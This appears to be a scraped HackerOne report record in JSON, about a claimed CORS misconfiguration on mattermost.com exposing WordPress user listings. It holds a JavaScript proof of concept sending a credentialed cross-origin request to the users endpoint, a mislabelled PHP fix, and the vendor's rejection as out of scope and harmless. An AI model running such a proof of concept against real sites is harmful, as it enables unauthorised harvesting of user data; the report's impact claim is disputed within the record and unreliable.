@@ -1,0 +1,197 @@
+{
+  "id": 1113759,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTEzNzU5",
+  "url": "https://hackerone.com/reports/1113759",
+  "title": "[mattermost.com] CORS Misconfiguration leakage of admin users",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "readable_substate": "N/A",
+  "created_at": "2021-03-01T12:21:27.381Z",
+  "submitted_at": "2021-03-01T12:21:27.417Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "deb0con",
+    "url": "/deb0con",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/rshtzgfzd3aqze11wxoban88t79d/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35268,
+    "url": "https://hackerone.com/mattermost",
+    "handle": "mattermost",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Mattermost",
+      "twitter_handle": "Mattermost",
+      "website": "https://mattermost.com",
+      "about": "Open-source collaboration, self-managed or SaaS"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-03-19T08:28:33.655Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-12T06:14:57.229Z",
+  "team_member_agreed_on_going_public_at": "2021-03-19T08:28:33.572Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Sumarry :**\nCORS policies on pages containing sensitive information should be reviewed to determine whether it is appropriate for the application to trust both the intentions and security posture of any domains granted access.\nIt's possible to get information about the users registered (such as: id, name, login name, etc.) without authentication in Wordpress via API on\nThe vulnerability is registered as #772744 #356047 #591302 #138244 #329791\n\n**Platform(s) Affected: [website]**\nhttps://mattermost.com/wp-json/wp/v2/users/\n\n**Proof On Concept:**\n```javascript\n<html>\n     <body>\n         <h2>CORS PoC</h2>\n         <div id=\"demo\">\n             <button type=\"button\" onclick=\"cors()\">Exploit</button>\n         </div>\n         <script>\n             function cors() {\n             var xhr = new XMLHttpRequest();\n             xhr.onreadystatechange = function() {\n                 if (this.readyState == 4 && this.status == 200) {\n                 document.getElementById(\"demo\").innerHTML = alert(this.responseText);\n                 }\n             };\n              xhr.open(\"GET\",\n                       \"https://mattermost.com/wp-json/wp/v2/users/\", true);\n             xhr.withCredentials = true;\n             xhr.send();\n             }\n         </script>\n     </body>\n </html>\n```\n  * Save as ``.html`` and Open and click Exploit on browsers\n\n**Fix**\nUse this code will hide the users list and give 404 as the result, while rest of the api calls keep running as they were.\n```javascript\nadd_filter( 'rest_endpoints', function( $endpoints ){\n    if ( isset( $endpoints['/wp/v2/users'] ) ) {\n        unset( $endpoints['/wp/v2/users'] );\n    }\n    if ( isset( $endpoints['/wp/v2/users/(?P<id>[\\d]+)'] ) ) {\n        unset( $endpoints['/wp/v2/users/(?P<id>[\\d]+)'] );\n    }\n    return $endpoints;\n});\n```\n\n## Impact\n\nInformation disclosure in **``/wp-json/wp/v2/users/``**",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 5,
+  "voters": [
+    "0xelkomy",
+    "h4x0r_dz",
+    "wgh_",
+    "abudahab",
+    "bayes"
+  ],
+  "structured_scope": {
+    "databaseId": 59133,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.mattermost.com",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 31851,
+      "category": "team",
+      "content": "The issue was reported on our website mattermost.com which is clearly defined as out of scope in our program's policy. Moreover there are no account specific sensitive information revealed here. Whatever information specified is already public and hence we don't see any security impact here. ",
+      "updated_at": "2021-03-19T08:27:27.547Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 1382738,
+        "username": "rohitesh_mattermost",
+        "name": "Rohitesh",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2020-11-05T14:18:53.069Z",
+        "url": "https://hackerone.com/rohitesh_mattermost",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/ra7eh366iu9egy616ute08x1mm4n/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b?response-content-disposition=inline%3B%20filename%3D%22mattermost-logo.png%22%3B%20filename%2A%3DUTF-8%27%27mattermost-logo.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H3YTETR%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T064155Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED8aCXVzLXdlc3QtMiJHMEUCIEHVdD3b1H%2BO02PaVCE1h3XbBI%2BcBUpkLfjIxabpDoBCAiEA9OxqBzrex7FNJmAV5KxfpbEweTlldYyR3VlDaXyURcsqsgUICBADGgwwMTM2MTkyNzQ4NDkiDIirD2M%2FMdyy3WneoCqPBQbUJYjHAl73xMmWOp6w%2BB82YeSWxU3LpU%2FggGxNQnKp1vUXp58ywArWezebo2f9FyQvklg79flvXGCWJuksgZLLrt35YBctyMc26lOMqAEGntwahKhxhebM5bqrZTi0tpbAW7tNNKJLAXhEUbb63AUVMFdebpGPvalOvwH%2FmWvbjOaEXOj8q6MAnoP0B3PEv0iqgu1bKY8laNsU18THbksiR7x5ymYAopIuYAOsHXUSFJ3dxXFhc6gbLioupxXaNCIR8T4aB7U1XlUq7Ks5SVwlc6gJyPD3PvsRQiA%2FAEtMkX%2FHpWcPT1Zh0V2w7UVmyNbDxFiDDDQ2AP9Nrl%2FaEPgdJq1xpgk63pDhfgkz7sJEL2RXXcwgmLU%2BmALj23lITV90n8DMuS1EsfSqF68RHYrMrHljBvgfGOgWDXsvuET1sOeBNCxmX2SdBP5Y5lDXEQsdVJ1qiE5hOpvVgusVhQNaexval%2FVvgvLPDOR%2B4zWD45eMmveBQAWUGGU5wMjl12sxoQCB26IOsy%2B8ypAFtGWVJiy6nfQmuItwQ558RlcFo4Qi43cQHXXw6VQeDqsFQLmKrwo9IIgZKO%2Fu%2FOkA7FSgFriVdANLLI9uLH2vUkWDzV4OUsf%2BHLsGTaQ6hKuG7g%2B1ntCWpRKkG8DVApHRXZlRiQrSXN1UZCIvvW9sPfEE1X%2Fg3UcMlahzMNVKjvavekzGjELCHKw7OSatIUcGxoHX59zqFXjpFhzQFxYAX0qHYxVsJpSaHDs5KQBK4W%2FVWKEeDLmjOUM2Ktd3xi5CFfYMvKsnllmwBFXnXf%2F6vDh5jkiwB7g0FbQzSOMG%2FxeXo6s4kX0JnSmhcVrfBfIZyy8KkT4KXTFfA9n%2FXUa5SGkwzqud0gY6sQGpdoe8RcNVUSjOr5AYnI2dziOInBKjbEXaB0lHKpnMPWHdfFiHjkUs04VFB1OKsDOfO5ZUGOFw58BJiWsxjxQKe0zfugmc3b7fV98IkgU5fG9QF%2Fbf7Hrf6vsFfsKso2QmJu%2BvsbrThxqqirmGghrqG3DbAJXunkYhdDd%2FS%2BOUeAaB2QJQV%2BMECfwx6PKGEyFRFeQ5G96KgaJazd0mGbPAL3uqlHZA01FAT3OiYD5XgYc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2535e0a00a5b9f905e294c7e1e4600201fbd7f68516dfd2c283a062e5b4b55a5",
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/ra7eh366iu9egy616ute08x1mm4n/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542?response-content-disposition=inline%3B%20filename%3D%22mattermost-logo.png%22%3B%20filename%2A%3DUTF-8%27%27mattermost-logo.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H3YTETR%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T064155Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED8aCXVzLXdlc3QtMiJHMEUCIEHVdD3b1H%2BO02PaVCE1h3XbBI%2BcBUpkLfjIxabpDoBCAiEA9OxqBzrex7FNJmAV5KxfpbEweTlldYyR3VlDaXyURcsqsgUICBADGgwwMTM2MTkyNzQ4NDkiDIirD2M%2FMdyy3WneoCqPBQbUJYjHAl73xMmWOp6w%2BB82YeSWxU3LpU%2FggGxNQnKp1vUXp58ywArWezebo2f9FyQvklg79flvXGCWJuksgZLLrt35YBctyMc26lOMqAEGntwahKhxhebM5bqrZTi0tpbAW7tNNKJLAXhEUbb63AUVMFdebpGPvalOvwH%2FmWvbjOaEXOj8q6MAnoP0B3PEv0iqgu1bKY8laNsU18THbksiR7x5ymYAopIuYAOsHXUSFJ3dxXFhc6gbLioupxXaNCIR8T4aB7U1XlUq7Ks5SVwlc6gJyPD3PvsRQiA%2FAEtMkX%2FHpWcPT1Zh0V2w7UVmyNbDxFiDDDQ2AP9Nrl%2FaEPgdJq1xpgk63pDhfgkz7sJEL2RXXcwgmLU%2BmALj23lITV90n8DMuS1EsfSqF68RHYrMrHljBvgfGOgWDXsvuET1sOeBNCxmX2SdBP5Y5lDXEQsdVJ1qiE5hOpvVgusVhQNaexval%2FVvgvLPDOR%2B4zWD45eMmveBQAWUGGU5wMjl12sxoQCB26IOsy%2B8ypAFtGWVJiy6nfQmuItwQ558RlcFo4Qi43cQHXXw6VQeDqsFQLmKrwo9IIgZKO%2Fu%2FOkA7FSgFriVdANLLI9uLH2vUkWDzV4OUsf%2BHLsGTaQ6hKuG7g%2B1ntCWpRKkG8DVApHRXZlRiQrSXN1UZCIvvW9sPfEE1X%2Fg3UcMlahzMNVKjvavekzGjELCHKw7OSatIUcGxoHX59zqFXjpFhzQFxYAX0qHYxVsJpSaHDs5KQBK4W%2FVWKEeDLmjOUM2Ktd3xi5CFfYMvKsnllmwBFXnXf%2F6vDh5jkiwB7g0FbQzSOMG%2FxeXo6s4kX0JnSmhcVrfBfIZyy8KkT4KXTFfA9n%2FXUa5SGkwzqud0gY6sQGpdoe8RcNVUSjOr5AYnI2dziOInBKjbEXaB0lHKpnMPWHdfFiHjkUs04VFB1OKsDOfO5ZUGOFw58BJiWsxjxQKe0zfugmc3b7fV98IkgU5fG9QF%2Fbf7Hrf6vsFfsKso2QmJu%2BvsbrThxqqirmGghrqG3DbAJXunkYhdDd%2FS%2BOUeAaB2QJQV%2BMECfwx6PKGEyFRFeQ5G96KgaJazd0mGbPAL3uqlHZA01FAT3OiYD5XgYc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d85c849945fcc3070722520ec243dbfa045998976458b02cd1e7879eb631694c",
+          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTYyMjYwMywicHVyIjoiYmxvYl9pZCJ9fQ==--0f187717accbf2a3298aab9224bf6b6325cb389e/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c056620eda1974f1f89371a5ac2cfa9203d2b27e/mattermost-logo.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1113759",
+  "votes": 5,
+  "latest_disclosable_activity_at": "2021-03-19T08:28:33.683Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-03T14:41:55.596899",
+    "source": "https://hackerone.com/reports/1113759.json",
+    "report_id": 1113759
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTEzNzU5",
+    "databaseId": "1113759",
+    "title": "[mattermost.com] CORS Misconfiguration leakage of admin users",
+    "url": "https://hackerone.com/reports/1113759",
+    "state": null,
+    "substate": "not-applicable",
+    "disclosed_at": "2021-03-19T08:28:33.655Z",
+    "created_at": "2021-03-01T12:21:27.381Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE4",
+      "name": "Information Disclosure",
+      "external_id": "cwe-200"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "deb0con"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1MjY4",
+      "handle": "mattermost",
+      "name": "Mattermost",
+      "url": "https://hackerone.com/mattermost",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzExMTM3NTk=",
+    "_id": "1113759",
+    "disclosed": true,
+    "votes": 5,
+    "latest_disclosable_activity_at": "2021-03-19T08:28:33.683Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTEzNzU5",
+      "databaseId": "1113759",
+      "title": "[mattermost.com] CORS Misconfiguration leakage of admin users",
+      "url": "https://hackerone.com/reports/1113759",
+      "disclosed_at": "2021-03-19T08:28:33.655Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1MjY4",
+      "handle": "mattermost",
+      "name": "Mattermost",
+      "url": "https://hackerone.com/mattermost",
+      "currency": "usd"
+    }
+  }
+}
